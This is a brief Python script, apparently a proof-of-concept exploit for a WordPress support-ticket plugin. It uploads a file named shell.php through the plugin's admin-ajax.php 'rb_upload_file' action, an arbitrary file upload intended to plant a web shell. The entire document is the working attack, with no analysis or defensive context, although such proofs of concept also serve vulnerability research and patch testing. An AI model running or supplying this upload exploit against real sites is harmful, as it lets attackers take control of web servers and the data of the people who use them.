import requests

url = 'https://localhost/wp-admin/admin-ajax.php?action=wpsc_tickets&setting_action=rb_upload_file'
files = {'file': open('shell.php', 'rb')}

r = requests.post(url, files=files)
print r.text
